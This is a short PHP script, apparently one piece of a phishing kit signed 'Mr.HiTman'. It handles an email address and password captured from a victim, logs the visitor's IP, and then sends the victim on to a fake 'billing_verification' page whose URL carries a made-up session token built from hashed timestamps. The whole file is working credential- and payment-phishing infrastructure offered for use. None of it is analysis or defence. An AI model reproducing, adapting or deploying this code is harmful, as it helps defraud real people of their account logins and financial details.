<?
###################################
// Don't change anything here
// Created By Mr.HiTman
// From Jordan
##################################

ini_set("output_buffering",4096);
session_start();



$_SESSION['errors2'] = $errors2=0;
$_SESSION['TheEmail'];
$_SESSION['ThePassword'];
$_SESSION['radio'];
$_SESSION['post'] = $post = $_POST['post'];

$email = $_SESSION['TheEmail'];
$pass = $_SESSION['ThePassword'];
$radio = $_SESSION['radio'];

$ip = $_SERVER['REMOTE_ADDR'];



//Processing Data (Don't Touch)
function is_email($input) {
  $email_pattern = "/^([a-zA-Z0-9\-\_\.]{1,})+@+([a-zA-Z0-9\-\_\.]{1,})+\.+([a-z]{2,4})$/i";
  if(preg_match($email_pattern, $input)) return TRUE;

}

if(!is_email($email))
{
$userer=1;
}
else
{
$userer=0;
}


if ($userer==1)
{
$errors2=1;
}
else{
$errors2=0;
}

if ($pass=="")
{
$errors2=1;
}
else{
$errors2=0;
}



if ($radio=="1")
{
$encoding_url="details.php?action=billing_verification=true&_session;".md5(time()).md5(time());
header("Location: $encoding_url");
}
else if


 

($errors2==0)
{
$encoding_url="details.php?action=billing_verification=true&_session;".md5(time()).md5(time());
header("Location: $encoding_url");

}

else
{
header("Location: login_error.php?error=$errors2");
}



?>